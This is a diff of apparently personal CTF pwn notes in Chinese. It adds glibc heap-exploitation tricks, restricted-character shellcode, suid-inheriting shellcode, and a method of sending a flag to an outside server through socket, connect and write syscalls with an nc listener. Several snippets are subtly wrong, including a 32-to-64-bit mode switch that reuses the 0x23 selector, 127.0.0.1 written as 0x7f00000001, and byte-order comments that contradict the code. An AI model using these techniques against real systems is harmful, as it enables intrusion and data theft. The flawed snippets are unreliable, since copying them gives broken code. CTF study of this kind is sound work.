@@ -9,10 +9,113 @@ date: 2023-12-28 12:00:00
 
 [toc]
 
-
 以下内容都是做题的时候遇到的一些知识点，但是由于时间原因，不可能详细记录每道题的详细解法，因此将这些题目的`trick`进行一个简要的总结。
 
-# exec 1>&0
+# tcache伪造size位并分配到任意大小的tcache
+
+这是`tache`的一个缺陷，根据测试，直到`glibc2.38`，该`trick`仍然有效。
+
+我们已知通过`house of spirit`来释放一个`fake chunk`的时候，需要保证`fake chunk`的下一个`chunk`的`size`和`inuse`位合法。
+
+**然而，对于`tcache`，没有任何安全机制来检查下一个`chunk`的`size`和`inuse`。**这意味着我们只需要构造一个任意位置的`fake chunk`，亦或者是合法的`chunk`但是篡改其`size`域，即可将`chunk`释放到我们指定大小的`tcache`中去。
+
+`poc`如下：
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+    size_t* a = malloc(0x100);
+    size_t* b = malloc(0x100);
+    a[0] = 0;
+    a[1] = 0x251;
+    free((size_t)a + 0x10);
+    return 0;
+}
+```
+
+可以看到，我们在`chunk a`内部伪造了一个`fake chunk`，没有绕过任何安全检查的操作，直接能够将`fake chunk`释放到`size`为`0x251`的`chunk`中。
+
+# got表绑定前可以通过修改其表项来更改调用函数
+
+如上所述。
+
+![image-20240514102141802](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202405141021928.png)
+
+由上可知，`atoi`函数目前暂未绑定`got`表，因此，若我们将其最低位更改为`0x70`（也就是让其变为`printf`的表项），其便可以寻找到`printf`的表项，由此`aoti`函数将变为`printf`函数。
+
+# glibc中rand()预测
+
+实际上只要泄露的数字足够多，完全可以预测：
+
+```c
+o[n] == o[n-31] + o[n-3]
+o[n] == o[n-31] + o[n-3] + 1
+```
+
+# glibc中rand()精确计算
+
+上面预测的方法需要我们获得非常多的随机数据，而若我们可以泄露`libc`上的数据时，则无需获得那么多随机数。方法如下：
+
+- 泄露`libc`中的`randtbl`数组，该数组的每个元素都为四字节（`_DWORD`），第一个元素为`RANDOM_TYPE`，其他的数为状态数组`state`。
+- 通过状态数组`state`即可计算出随机数，即`random_value = (state[i] + state[i+1]) >> 1`，并更新`state[i+1] = (state[i] + state[i+1])`。计算完成后，`i = i+1`。
+
+来个示例如下：
+
+```c
+unsigned int randtbl = {0x3, 0x443ce9c6, 0x57fca257, 0x6993085d, 0xfbd8ceef, 0x85998dfc, 0x6c5b76f8, 0xc6c5e909, 0x48fff3af, 0xb2d42041, 0xec1b5227, 0x15f73029, 0x15d4373d, 0x8cc614f7, 0xc5175937, 0xa68dae57, 0x6bb42a56, 0x917dcf02, 0x5dbdf47e, 0xff461126, 0xc75b3928, 0xcfd6759, 0xef3e7a20, 0xb26779e5, 0x18184540, 0x1f112143, 0xf162e8bc, 0xaa77e535, 0x887e7c1f, 0x4560b784, 0x8d7e5c50, 0xfb3ba76c}
+```
+
+因此第一次调用`rand()`时，结果为：
+
+```c
+assert(rand() == (0x443ce9c6 + 0xfbd8ceef) >> 1)
+// 0x200adc5a
+```
+
+并更新`rantbl`为如下：
+
+```c
+unsigned int randtbl = {0x3, 0x443ce9c6, 0x57fca257, 0x6993085d, 0x4015b8b5, 0x85998dfc, 0x6c5b76f8, 0xc6c5e909, 0x48fff3af, 0xb2d42041, 0xec1b5227, 0x15f73029, 0x15d4373d, 0x8cc614f7, 0xc5175937, 0xa68dae57, 0x6bb42a56, 0x917dcf02, 0x5dbdf47e, 0xff461126, 0xc75b3928, 0xcfd6759, 0xef3e7a20, 0xb26779e5, 0x18184540, 0x1f112143, 0xf162e8bc, 0xaa77e535, 0x887e7c1f, 0x4560b784, 0x8d7e5c50, 0xfb3ba76c}
+```
+
+第二次调用`rand()`时，结果为：
+
+```c
+assert(rand() == (0x57fca257 + 0x85998dfc) >> 1)
+```
+
+# setcontext + 61便捷修改方式
+
+实际上是`SigreturnFrame()`，使用`bytes(frame)`即可
+
+# 使用mmap代替read读取文件
+
+典型的`mmap`如下所示：
+
+```c
+mmap(0x80000, 0x10000, 1, flags=1, fd=3, offset=0);
+// 其中flags定义如下：
+// MAP_SHARED（1）：映射会被其他映射到同一文件的进程所共享。因此，对映射区域的写入会影响到其他映射到同一文件的进程，反之亦然。
+//MAP_PRIVATE（2）：创建一个私有的映射。对映射区域的写入不会影响到其他进程，也不会影响到原文件。这个标志通常用于需要对映射的数据做修改，而不希望影响到其他进程或者原文件的情况。
+// 因此定义为1或2都可以。
+```
+
+但不能将`flags`设置为`MAP_ANONYMOUS=0x20`或者其他值，否则会调用失败。
+
+# srand(time(0))绕过(附带Python执行C语言)
+
+`time(0)`是当前时间戳，其最小单位为秒数，那么在同一秒钟获取该时间戳就好了。
+
+```python
+from ctypes import *
+
+libc = cdll.LoadLibrary('./libc.so.6')
+libc.srand(libc.time(0))
+```
+
+# exec 1>&0, close(1)
 
 `stdin` 是`0`
 
@@ -21,6 +124,93 @@ date: 2023-12-28 12:00:00
 `stderr` 是`2`
 
 程序使用`close(1)`关闭了输出流，那么可以使用`exec 1>&0`将其重定向到`stdin`，因为这三个都是指向终端的，可以复用。
+
+此外，也可以直接修改掉`_IO_2_1_stdout_`的`_fileno`字段为`2`或者`0`，也可以再次打开`stdout`。
+
+# 格式化字符串close(1)
+
+书接上回。若格式化字符串`close(1)`，主要的解决办法都是有如下几种解决办法：
+
+- 将`_IO_2_1_stdout_`的`fileno`字段改为`2`
+- 将`stdout`的指针（一般位于`bss`）指向`stderr`
+
+因此，大致可以分为如下几种方式来在格式化字符串中实现：
+
+## 改printf返回地址到_start
+
+若改`printf`返回地址到`_start`，我们便会在栈上留下一个`_IO_2_1_stdout_`的指针。
+
+再次运行到这里时，我们就可以首先修改该指针末尾使其指向其`fileno`，将其改为`2`。即可绕过。
+
+## 利用magic_gadget改bss上的stdout指针
+
+`bss`上的`stdout`和`stderr`一般后三位不同，因此也难以直接修改。
+
+但是我们可以利用`magic_addr`来修改`bss`上的`stdout`指针为`_IO_2_1_stderr_`。
+
+有关`magic_gadget`可以看本文的`magic gadget`部分内容。
+
+此外需要注意的是，修改后只能用`printf`而不是`puts`来泄露内容，因为`puts`是不走`bss`上的`IO`的。
+
+# 系统调用前六个参数与函数前六个参数
+
+系统调用的参数从上到下以此为：
+
+```assembly
+rdi
+rsi
+rdx
+r10
+r8
+r9
+```
+
+与此同时，函数的前六个参数仅有第四个参数`r10`和`rcx`的区别，如下：
+
+```assembly
+rdi
+rsi
+rdx
+rcx
+r8
+r9
+```
+
+# 对开启了PIE的程序下断点
+
+可以通过如下方式在程序`0x1000`处下断点：
+
+```bash
+b *$rebase(0x1000)
+```
+
+# 高版本申请unsortedbin中chunk的冷知识
+
+某日发现高版本中直接申请下`unsortedbin`中`chunk`等同大小的`chunk`时，会先将该`chunk`放到`tcache`，随后申请出来。
+
+这就导致申请回来的`chunk`含有堆地址(`tcache->key`)，而不是`main_arena+xxx`。
+
+解决办法是申请一个小一点的即可。
+
+# pwntools发送一个EOF
+
+可以用`sh.shutdown_raw('send')`来发送`EOF`，效果是让`read`函数返回`0`。
+
+但是似乎用了之后也无法得到`shell`了，这个有没有用呢？不清楚
+
+**更新**：查看这篇[pwntools发送eof信号_pwntools send-CSDN博客](https://blog.csdn.net/weixin_43921239/article/details/117341777)
+
+# CET安全机制
+
+`CET`安全机制分为两个，`shadow stack`和`IBT(Indirect Branch Tracking)`。
+
+## shadow stack
+
+在程序使用`call func`的时候，会记录下当前的`rip`，即调用函数的返回地址。在函数退出时会将`shadow stack`里面的返回地址和栈上的返回地址进行比对，若不一样，则说明返回地址遭到篡改。可以有效防止栈溢出等`ROP`类攻击方法。
+
+## IBT
+
+`IBT`使得无法任意控制程序执行流到任意位置。在函数开始时，函数会有一个`endbr64`或`endbr32`标记。若`jmp`和`call`等控制程序执行流的操作没有导向`endbr`标记，则说明程序执行流可能遭到篡改。
 
 # 存在格式化字符串漏洞，但是只能利用一次
 
@@ -175,7 +365,9 @@ exit -> __run_exit_handlers -> _dl_fini
 
 使用如下方式查看该`_dl_rtld_lock_recursive`的地址：
 
-`p &_rtld_global._dl_rtld_lock_recursive`
+```c
+p &_rtld_global._dl_rtld_lock_recursive
+```
 
 ![image-20231022141016950](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20231022141016950.png)
 
@@ -188,7 +380,7 @@ _dl_rtld_lock_recursive = _rtld_global + 0xf08
 _dl_rtld_unlock_recursive = _rtld_global + 0xf10
 ```
 
-此外，若无法打`one_gadget`，也可以打`system`，其参数为`_rtld_global.dl_load_lock.mutex`。推荐通过调试得出。
+此外，若无法打`one_gadget`，也可以打`system`，其参数为`_rtld_global._dl_load_lock.mutex`。推荐通过调试得出。
 
 # exit_hook 2
 
@@ -328,6 +520,28 @@ _rtld_global._dl_ns[0]._ns_loaded->l_addr // 因为_rtld是ld里面的
 
 即：两次三明治结构会让保留有重叠指针的情况下让三个`chunk`再次合并为一个`unsortedbin chunk`。
 
+# off by null之chunk shrink
+
+`chunk shrink`算是另一种`off by null`的利用，相比于三明治结构要比较复杂。适用于一些极端情况。
+
+使用方法：小大小三个`chunk`（不能是`fastbin`大小），设为`abc`。`b`为`0x510`（例如），在其最末尾写`fake prev_size`为`0x500`，释放`b`置入`unsortedbin`，通过`a`进行`off by null`将`b`的`size`变为`0x500`。申请几个加起来为`0x500`的`chunk`，第一个不能为`fastbin`大小，例如三个为`0x88`，`0x18`，`0x448`，设为`def`。先后释放`d`和`c`，将会导致最开始申请的`b`和`c`合并，由此再次申请回`d`，再申请回`e`可以获得重叠的`e`指针。
+
+# off by null之无法控制prev_size时
+
+特殊情况，有的时候无法控制`prev_size`。此时可以考虑使用`unsortedbin`合并时会自动往`prev_size`写数据的特性。
+
+如下三个大小为`0x100`的`chunk`：
+
+```
+| chunk A |
+| chunk B |
+| chunk C |
+```
+
+先后释放`A B C`，这会使得`A`先和`B`合并，并随之与`C`合并。而释放`B`的时候，由于`AB`合并，`C`的`prev_size`便被写了一个`0x200`，即`A B`大小之和。
+
+而当我们释放掉三个`chunk`时，`C`的`prev_size`仍然还在。此时我们再先后申请回`A B C`，`C`的`prev_size`不会被清空。
+
 # glibc2.23下通过劫持vtable来getshell
 
 程序调用`exit`时，会遍历`_IO_list_all`，并调用`_IO_2_1_stdout_`下的`vtable`中的`setbuf`函数。而在`glibc2.23`下是没有`vtable`的检测的，因此可以把假的`stdout`的虚表构造到`stderr_vtable-0x58`上，由此`stdout`的虚表的偏移`0x58(setbuf的偏移)`就是`stderr`的虚表位置。
@@ -336,9 +550,17 @@ _rtld_global._dl_ns[0]._ns_loaded->l_addr // 因为_rtld是ld里面的
 
 总是忘了在`largebin`中只有一个`chunk`的时候它的`fd_nextsize`和`bk_nextsize`会指向自身。特此记录，可以通过`largebin`的`bk_nextsize`和`fd_nextsize`来泄露堆地址。
 
-# 反调试
+# largebin attack后最快恢复链表的方法
+
+个人经验。`largebinattack`我们一般利用将`unsortedbin`中的`chunk`挂入`largebin`时的分支，我们可以记录在`largebin`中的`chunk`还没有被修改`bk_nextsize`时的`fd、bk、fd_nextsize、bk_nextsize`四个指针。`largebin attack`完成后，我们先申请回挂入的`unsortebin chunk`，然后将`largebin`中的`chunk`修改回之前我们记录的四个指针，再申请回即可恢复。
+
+# 反调试与ptrace
 
 部分题目可能会使用子进程、`ptrace`的方式来防止调试，一旦调试就会出错。这种情况直接`patch`掉该部分即可，例如`call`反调试的函数可以直接跳转到下一条指令转而不执行`call`。
+
+## ptrace在调试时返回-1，非调试时返回0
+
+如标题所示，这也就是`ptrace`反调试的原理。
 
 # canary绕过大全
 
@@ -449,6 +671,125 @@ syscall
 ret
 ```
 
+## 限制可见字符
+
+比较常见不必多说，`AE64`一把梭
+
+## shellcode限制字符的爆破脚本
+
+我们知道若`shellcode`类的题目限制了使用的字符为可见字符或字母数字等情况时，可以使用`ae64`一把梭哈。然而，有的情况的限制更为严格，这种时候往往需要进行手搓`shellcode`了。
+
+这里是一份`shellcode`可用字符的爆破脚本：
+
+```python
+import itertools
+from pwn import *
+
+context.arch = "amd64"
+
+s = "0123456789\x3a\x3b\x3c\x3d\x3e\x3f\x40" #可用字符
+
+for x in range(3):
+    for y in itertools.product(s, repeat=x+1):
+        res = disasm("".join(y).encode())
+        need_p = 1
+        for kk in  (".byte", "rex", "ds", "bad", "ss"):
+            if kk in res:
+                need_p = 0
+                break
+        if need_p:
+            print(res)
+```
+
+## shellcode没有地方写flag内容时，可以用mmap
+
+有时候遇到`shellcode`段在写好之后又被使用`mrotect`给禁用写权限的情况。
+
+这个时候可以使用`mmap`来分配一段内存或者代替`read`，从而让系统自己决定或者指定一段可写区域。
+
+## 奇数位置写奇数，偶数位置写偶数
+
+最难的点在于如何构造`syscall`，因为`syscall`的字节码为`\x0f\x05`。
+
+对于这种题目，一般思路我们需要尽快再次构造一个`read`，避免题目限制给我们带来的影响。
+
+而对于`syscall`的构造，可以采用如下思路：
+
+- 利用一条指定位置修改的指令，例如`sub [rsi+0x2d], bx`来修改出`syscall`指令。里面的`0x2d`可以替换为任意奇数。
+- 直接通过`call`来执行`glibc`中的函数而不是使用`syscall`。甚至可以使用`glibc`中的`syscall`函数。
+- 通过`call`构造的时候，可以先从程序的`got`表里面提取`libc`的地址来计算。
+
+此外，奇数和偶数可以分别用如下不会干扰`shellcode`的指令：
+
+- 奇数可以使用`gs`、`std`。
+- 偶数可以使用`nop`。
+
+最后，总结一些可用指令：
+
+偶数：
+
+```assembly
+pop rax
+push rax
+pop rsi
+push rsi
+pop rdx
+push rdx
+nop
+```
+
+奇数：
+
+```assembly
+pop rdi
+push rdi
+pop rcx
+push rcx
+gs
+std
+```
+
+奇偶组合：
+
+```assembly
+pop r10
+push r10
+pop r8
+push r8
+call rax
+call rsi
+call rdx # call指令为0xff，因此要满足奇偶只有这几个
+add eax, 0x01020102 # 奇偶奇偶奇，add eax部分为单字节0x5
+```
+
+偶奇组合：
+
+```assembly
+xchg rax, rdi
+xchg rsi, rdx # 偶奇偶
+sub [rsi+0x2d], bx # 偶奇偶奇
+mov rax, [rax] # 偶奇偶
+mov rsi, [rsi] # 偶奇偶
+mov rdx, [rdx] # 偶奇偶
+sub ax, 0x0102 # 偶奇偶奇，数字为奇偶即可
+add ax, 0x0102 # 偶奇偶奇，数字为奇偶即可
+add si, 0x0201 # 偶奇偶奇偶，数字为偶奇
+add rax, rdi # 偶奇偶
+add rax, rsi # 偶奇偶
+add rax, rdx # 偶奇偶
+sub rax, rdi # 偶奇偶
+sub rax, rsi # 偶奇偶
+sub rax, rdx # 偶奇偶
+inc ax # 偶奇偶
+dec ax # 偶奇偶
+mov rax, rsp # 偶奇偶
+mov rsi, rsp # 偶奇偶
+mov rdx, rsp # 偶奇偶
+xor rax, rax # 偶奇偶
+xor rsi, rsi # 偶奇偶
+xor rdx, rdx # 偶奇偶
+```
+
 # 将global_max_fast打了unsortedbin后链表损坏如何打fastbin attack
 
 `unsortedbin attack`打了之后链表会损坏，若是要继续申请其它`chunk`将会出错。
@@ -504,6 +845,12 @@ $ ROPgadget --binary ./cscctf_2019_qual_signal | grep ebx
 
 例如，可以通过`csu`和这个`magic gadget`配合来将`alarm`的`got`表的值加五，`alarm+5`实际上就是`syscall`。
 
+后记：这个`gadget`我实测使用`ropper`找不到。可以用如下方式的`ROPgadget`来找：
+
+```bash
+ROPgadget --binary ./pwn | grep 'ebx'
+```
+
 # malloc_consolidate实现fastbin double free->unlink
 
 大小属于`fastbin`的`chunk`被`free`时，会检查和`fastbin`头相连的`chunk`是否是同一个`chunk`。然而，`malloc_consolidate`可以将`fastbin`链表中的`chunk`脱下来添加到`unsortedbin`，并设置其内存相邻的下一个`chunk`的`prev_inuse`为`0`。`malloc_consolidate`可以由申请一个很大的`chunk`触发。由此，若只能释放同一个`fastbin`的`chunk`，可以先`free`它将其添加到`fastbin`，然后使用`malloc_consolidate`将其置入`unsortedbin`。此时便可以再次`free`该`chunk`添加到`fastbin`，此时一个位于`fastbin`，另一个位于`unsortedbin`。申请回`fastbin`的`chunk`，在里面伪造一个`fake chunk`，由于其下一个`chunk`的`prev_inuse`被设置，因此可以进行`unsafe unlink`。不适用于继续`fastbin attack`，因为另一个`chunk`不位于`fastbin`。例题为`sleepyHolder_hitcon_2016`.
@@ -528,9 +875,31 @@ $ ROPgadget --binary ./cscctf_2019_qual_signal | grep ebx
 
 若没有清零堆块，那么这种情况下`add`得到的`chunk`中可以含有各种残留的堆块指针和残留的`libc`地址，可以泄露或使用。
 
-# 若存在alarm，则可以利用偏移得到syscall
+# 继承suid程序
 
-如下所示，`alarm+5`即可获得`syscall`，正常情况则没有
+若一个程序为`suid`程序，通过这个程序获得`shell`也可以继承，适用于程序为`suid`但是`flag`需要高权限的情况。
+
+可以通过如下方式继承`suid`权限：
+
+```c
+setuid(geteuid())
+```
+
+对应汇编如下：
+
+```assembly
+mov eax, 0x6b
+syscall
+mov edi, eax
+mov eax, 0x69
+syscall
+```
+
+
+
+# 若存在alarm、close，则可以利用偏移得到syscall
+
+如下所示，`alarm+5`即可获得`syscall`，正常情况则没有。`close`中直接就有
 
 ![image-20240115104436982](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/image-20240115104436982.png)
 
@@ -546,3 +915,577 @@ payload += b'%100000c'
 具体多长呢？说不清楚，但是假如`printf`没有输出那个很长的空白字符串，那就说明执行到`malloc_hook`里面去了，对吧？
 
 所以可以观察是否有这个输出来判断是否是执行了`malloc_hook`。
+
+# 若能使用fstat系统调用，那么可以转32位下获得open系统调用
+
+如题，`64`位下`fstat`系统调用号为`5`，而在`32`位下系统调用号为`5`的是`open`系统调用。
+
+因此可以通过如下方式转`32`位。
+
+# 64位和32位系统调用互转
+
+利用`retfq`进行运行模式的转换。
+
+`retfq`就相当于`jmp rsp; mov cs, [rsp + 0x8]`，cs寄存器中`0x23`表示`32`位运行模式，`0x33`表示`64`位运行模式，所以我们只需要构造如下方式就可以实现`64`到`32`的模式转换：
+
+```assembly
+push 0x23
+push <ret_addr>
+retfq
+```
+
+同理，`32`位到`64`位可以通过如下方式：
+
+```assembly
+push 0x23
+push <ret_addr>
+retfq
+```
+
+# roderick师傅B站录播笔记
+
+## 工具专题
+
+### pwngdb
+
+- 可以使用`bcall`来将断点下到`call xx`的地方，例如`bcall memset`会下断点到`call memset`的地方而不是默认的`libc`内部。
+
+- 可以使用`tls`来查看`thread local storage`
+- `fmtarg`可以断在`printf`时计算`format string`的`index`
+- `heapinfoall`可以查看**每一个线程**的`heapinfo`
+- `magic`可以打印有用的函数和变量（`system`、`setcontext`、各种`hook`）
+- `fp`、`fpchain`分别可以打印`IO_FILE`结构和`IO_FILE`的链表
+- `chunkinfo`可以查看某个`chunk`的状态，例如**是否可以`unlink`等**
+
+- 和上面同理有`mergeinfo`
+
+### tmux使用
+
+在`~/.tmux.conf`编写以下配置：
+
+```tex
+set -g prefix C-a #
+unbind C-b # C-b即Ctrl+b键，unbind意味着解除绑定
+bind C-a send-prefix # 绑定Ctrl+a为新的指令前缀
+# 从tmuxv1.6版起，支持设置第二个指令前缀
+set-option -g prefix2 ` # 设置一个不常用的`键作为指令前缀，按键更快些
+#set-option -g mouse on # 开启鼠标支持
+# 修改分屏快捷键
+unbind '"'
+bind - splitw -v -c '#{pane_current_path}' # 垂直方向新增面板，默认进入当前目录
+unbind %
+bind \\ splitw -h -c '#{pane_current_path}' # 水平方向新增面板，默认进入当前目录
+# 设置面板大小调整快捷键
+bind j resize-pane -D 10
+bind k resize-pane -U 10
+bind h resize-pane -L 10
+bind l resize-pane -R 10
+```
+
+便可以通过前缀键\`加上`\`来左右分割屏幕，使用前缀键\`加上`-`来上下分割屏幕，并使用`hjkl`调整窗口大小。
+
+### one_gadget使用
+
+- 并不是一定要满足它写出的条件才可以使用，写出的是充分条件
+- 可以使用`one_gadget ./libc.so.6 -n func`来找出离某个函数最近的`one gadget`，在`partial overwrite`的时候非常有用
+- 可以使用`one_gadget --base`添加`libc`地址来输出完整地址
+
+### seccomp-tools使用
+
+- 主要是可以通过自己编写如下指令的方式来生成一个带有沙箱的`C`语言程序，非常方便
+
+```asm
+A = arch
+A == ARCH_X86_64 ? next : dead
+A = sys_number
+A >= 0X400000000 ? dead : next
+A == open ? dead : next
+A == write ? dead : next
+A == execve ? dead : next
+A == execveat ? dead : next
+ok:
+return ALLOW
+dead:
+return KILL
+```
+
+通过以下方式直接生成：
+
+```bash
+seccomp-tools asm ./libseccomp.asm -f c_source
+```
+
+它会生成`#include <sys/prctl.h>`方式的沙箱，不会对堆排布造成影响。
+
+### 关于patchelf
+
+`patchelf`的路径若过长，可能会导致程序内存空间排布出现问题，尽可能越短越好。
+
+`e.g.`：
+
+```bash
+patchelf --set-interpreter ./ld-2.23.so ./pwn
+patchelf --replace-needed libm.so.6 ./pwn
+```
+
+也可能会严重影响`ld`的各种函数，例如`tls`的
+
+### pwntools
+
+抽空去完整读一遍文档吧，很有用
+
+### 调试
+
+可以使用`pwncli`调试。这部分去看文档
+
+对于开启了`PIE`的程序，增加断点的方式可以采用：`b *$rebase(0x111)`
+
+### decomp2dbg
+
+[地址](https://github.com/mahaloz/decomp2dbg)，可以将`gdb`和`ida`联动，将`ida`反编译后的内容添加到`gdb`窗口中从而实现一边调试汇编一边查看`ida`的源码，它显示的`ida`的源码甚至拥有你修改过的函数名、变量名，因此也可以直接打印这些变量和名称。
+
+安装好之后`ida`在`plugin-decomp2dbg`中监听`3662`端口，在`gdb`通过如下方式使用：
+
+```bash
+decompiler connect ida --host localhost --port 3662
+```
+
+### dl_dbgsym
+
+[地址](https://github.com/veritas501/dl_dbgsym)可以通过该工具来完成：当你只有一个`libc.so.6`文件时，该工具可以自动帮你下载`ld`并且帮你下载其对应的符号链接，有该工具的话，甚至可以弃用`glibc-all-in-one`。
+
+### pwn_init
+
+可以直接自动完成`dl_dbgsym`的功能。而且还会给出一些额外的初始化工作，例如将文件设置为可执行等。可以使用`pwncli`的`pwncli init`直接完成该操作。
+
+# 控制mp_结构体来控制tcache分配大小
+
+`mp_`结构体位于`libc`中，如下所示：
+
+```bash
+pwndbg> p mp_
+$1 = {
+  trim_threshold = 131072,
+  top_pad = 131072,
+  mmap_threshold = 131072,
+  arena_test = 8,
+  arena_max = 0,
+  n_mmaps = 0,
+  n_mmaps_max = 65536,
+  max_n_mmaps = 0,
+  no_dyn_threshold = 0,
+  mmapped_mem = 0,
+  max_mmapped_mem = 0,
+  sbrk_base = 0x563676b5b000 "",
+  tcache_bins = 64,
+  tcache_max_bytes = 1032,
+  tcache_count = 7,
+  tcache_unsorted_limit = 0
+}
+```
+
+我们可以控制其中的`tcache_bins`（例如使用`largebin attack`）为更大的值，从而使得可以释放原本属于`largebin`大小的`chunk`到`tcache`中。
+
+使用如下方式查看其地址：
+
+```
+p &mp_.tcache_bins
+```
+
+# 控制mp_结构体来阻止mmap
+
+如上面所讲的`mp_`结构体，若修改其中的`mp.no_dyn_threshold`为一个不为`0`的值，则不再会以`mmap`的方式来申请`chunk`。
+
+# 通过修改chunk的is_mmap位来合并清零chunk
+
+若我们能够修改某个`chunk`的`is_mmap`位为`1`，且满足如下条件时：
+
+- 该`chunk`是页对齐的
+- 该`chunk`的`prev_size`也是页对齐的（能够整除`0x1000`）
+
+则当释放该`chunk`时，该`chunk`能够和`prev_size`大小的`chunk`合并，并将内容全部清零。
+
+由此，我们可以任意控制`prev_size`的大小，来清零指定的位置。
+
+该方法不能再申请`chunk`回来，只能达到一个清零的目的。
+
+# ret2VDSO
+
+`VDSO`即`Virtual Dynamically-linked Shared Object`。为了加快某些常用的函数和系统调用的访问速度，内核将一些常用的函数和系统调用映射到了`vdso`中，防止经常去系统调用陷入内核态。因此若条件具备，我们可以利用`VDSO`里面的`gadget`。这里记录一些小知识：
+
+- 关闭`ASLR`时，`vdso`段相对比较固定
+- 可以打`vdso`中的`rt_sigreturn`函数中的`gadget`进行`srop`，但是执行`rt_sigreturn`时栈顶需要和布置的`frame`有`160`的偏移，原因未知
+- 接上，还需要构造`gs`、`ss`这些不常用的寄存器
+
+# 通过socket传输数据，例如flag
+
+在`VNCTF2022`遇到一道题目，题目`close(0);close(1);close(2);`。而这道题也没办法写`shellcode`，难以进行侧信道爆破。
+
+此时可以通过`socket`将`flag`传输到我们的公网服务器。
+
+首先公网服务器监听`10001`端口：
+
+```bash
+nc -l -vv 10001
+# 有时候不行，我就使用下面这个
+nc -l -p 10001
+```
+
+然后通过`socket`、`connect`、`write`三个系统调用即可传输`flag`。
+
+## socket系统调用
+
+`socket`系统调用如下：
+
+```c
+int socket(int domain, int type, int protocol);
+```
+
+对于`IPV4`的地址，我们使用如下形式创建一个`socket`：
+
+```c
+socket(AL_INET, SOCK_STREAM, 0);
+// AL_INET表示IPV4，SOCK_SREAM表示TCP，0表示自动选择合适的协议
+```
+
+即：
+
+```c
+socket(2, 1, 0);
+```
+
+## connect系统调用
+
+`connect`系统调用如下：
+
+```c
+int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+```
+
+对于一个`IPV4`地址，有：
+
+```c
+connect(1, (struct sockaddr *)&server_addr, 0x10);
+
+// 结构体如下
+struct sockaddr{
+    unsigned short sa_family; // 地址族，例如 AF_INET 或 AF_INET6，AF_INET为2
+    char sa_data[14]; // 地址，根据地址族来的
+}
+```
+
+若地址为`IPV4`，那么`connect`的第二个参数我们一般传输一个`struct sockaddr_in`，如下所示：
+
+```c
+struct sockaddr_in{ 
+    sa_family_t sin_family; // 2字节，地址族，同上，小端序！
+    in_port_t sin_port; // 端口号，2字节，大端序
+    struct in_addr sin_addr; // IPV4结构体，4字节，大端序
+    char sin_zero[8]; // 填充为16
+}
+```
+
+其中`struct in_addr`结构体很简单，如下：
+
+```c
+struct in_addr{
+    in_addr_t s_addr; // 将IPV4转化为一个4字节十六进制数,例如127.0.0.1为0x7f00000001
+}
+```
+
+即，`server_addr`在内存中为2字节地址族（小端序），2字节端口（小端序），4字节`IPV4`地址（小端序），8字节0填充。
+
+```python
+# 例如，一个addr参数的Payload如下
+payload = payload.ljust(0x1d0, b'\x00') + p16(2) + p16(10001, endianness='big')
+payload += p32(0x7f000001, endianness='big') + p64(0)
+```
+
+## write系统调用
+
+没啥好说的，直接`write(sockfd, buf, size)`就可。
+
+例如，整个流程如下所示：
+
+```c
+socket(2, 1, 6); // 假设得到的fd为3
+connect(3, addr, 0x10);
+write(3, buf, size);
+```
+
+# house of botcake注意事项
+
+大致流程是对于同一个大小的`chunk`，先释放`7`个到`tcache`，再释放两个同样大小的`chunk A B`合并到`unsortedbin`。
+
+申请回一个`tcache`中的`chunk`，再释放`chunk B`，此时`tcache`中有`7`个`chunk`，而第一个即为`chunk B`；
+
+而此时`unsortedbin`中有一个`chunk A B`合并的`chunk`。
+
+此时，我们通过几次小于上述`size`的申请，来将`unsortedbin`里面的`chunk`申请走，来达到`tcache poisoning`的目的。
+
+例如上述大小为`0x90 (malloc 0x80)`，那么此时在`house of botcake`结束后`tcache`和`unsortedbin`如下：
+
+```c
+tcache:
+
+0x90(7): chunk B -> chunk -> chunk -> ...
+
+unsortedbin:
+
+0x120: chunk(A and B merged) <-> main_arena + x
+```
+
+通过以下方式，将`unsortedbin`中的`chunk`完全申请：
+
+```c
+malloc(0x30); // 0
+malloc(0x40); // 1
+
+malloc(0x30); // 2
+malloc(0x40); // 3
+```
+
+那么`tcache`中`chunk B`的指针即位于`chunk 2`中，可以进行`tcache poisoning attack`。
+
+# scanf未读入漏洞
+
+有时候会遇到如下形式的代码：
+
+```c
+def getint():
+	size_t tmp;
+    scanf("%lld", &tmp);
+    return tmp;
+
+choice = getint();
+
+switch(choice){
+     ...
+     default:
+        printf("Invalid choice: %d.\n", choice);
+}
+```
+
+然而，若输入`-`等字符让`scanf`不读入任何数据，则`tmp`是一个未初始化的值，那么可以经过`printf`打印出来，从而泄露栈上的数据。有的时候可以通过该方式泄露`libc`等重要的值。
+
+# 堆题没有show的思路小结
+
+## 通过stdout泄露输出libc地址
+
+若程序赋予了我们修改`stdout`的能力，且程序会调用相关`IO`的函数，则可以通过该方式来输出`libc`的地址
+
+若程序没有调用`IO`函数，无法通过该方式来输出（`__malloc_assert`中含有`fxprintf`）
+
+## 通过stderr输出敏感信息
+
+我们可以使得程序触发`__malloc_assert()`，从而触发`_IO_2_1_stderr_`来输出报错信息。由于触发了`__malloc_assert`往往会使得程序退出，因此只有`flag`等敏感信息已经被读取到内存空间后，再直接通过报错输出
+
+`stderr`的输出和`stdout`类似，**需要将`_flags`改为`0xfbad1887`，然后输出`_IO_write_base`和`_IO_write_ptr`之间的内容**
+
+这是因为`__malloc_assert`中的`__fxprintf`函数是`IO`函数，且其第一个参数传参为`NULL`的时候会转换为`stderr`，达到泄露的目的。
+
+## 通过partial overwrite
+
+不泄露`libc`地址，直接通过修改`unsortedbin`的`fd`指针和`got`表信息等方式来获得其他`libc`函数的执行能力。
+
+# global_max_fast利用
+
+`global_max_fast`是`main_arena`中的一个变量，它的值表示了最大的`fastbin chunks`的大小。
+
+若我们使用`laregbin attack`等方式来修改了这个值为一个特别大的值，我们便可以释放一个特别大的`chunk`到`main_arena`中的`fastbinsY`数组中，导致`libc`中被写入一个堆地址（`free`掉的`chunk`）。计算公式为：
+
+```c
+chunk size = (chunk addr - &main_arena.fastbinsY) x 2 + 0x20
+```
+
+其中，`chunk size`表示修改掉`global_max_fast`后，需要释放的`chunk`大小。
+
+`chunk_addr`表示希望写堆地址的地址。
+
+`&main_arena.fastbinsY`表示`fastbinsY`的首地址。
+
+# 使用ret2csu构建参数但不执行函数
+
